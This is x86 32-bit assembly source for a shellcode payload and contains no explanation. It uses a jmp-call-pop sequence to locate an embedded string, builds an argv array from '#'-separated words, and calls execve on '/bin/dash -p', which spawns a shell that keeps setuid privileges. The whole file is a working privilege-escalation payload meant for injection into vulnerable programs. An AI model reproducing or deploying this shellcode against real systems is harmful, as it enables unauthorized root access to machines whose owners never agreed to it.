.set SEP, 0x23
.text
.globl _start
_start:
	xorl %eax, %eax		# zeroes %eax
	cdq			# zeroes %edx
	jmp cmd
	back:
	movl (%esp), %esi	# address of cmd
	movl (%esp), %ebx	# address of progname
	movl %esp, %ecx		# argv
	loop_args:
	movl %esi, (%esp)
	pop %edi
	xor %edi, %edi
	loop_word:
	inc %edi
	cmpb $SEP, (%esi, %edi)
	jne loop_word
	lea 0x1(%esi, %edi), %esi
	movb %dl, -0x1(%esi)
	cmpb $SEP, (%esi)
	jne loop_args
	movl %edx, (%esp)
	movb $0xb, %al		# sys_execve
	int $0x80
cmd:
	call back
	.ascii "/bin/dash#-p"
	.ascii "##"


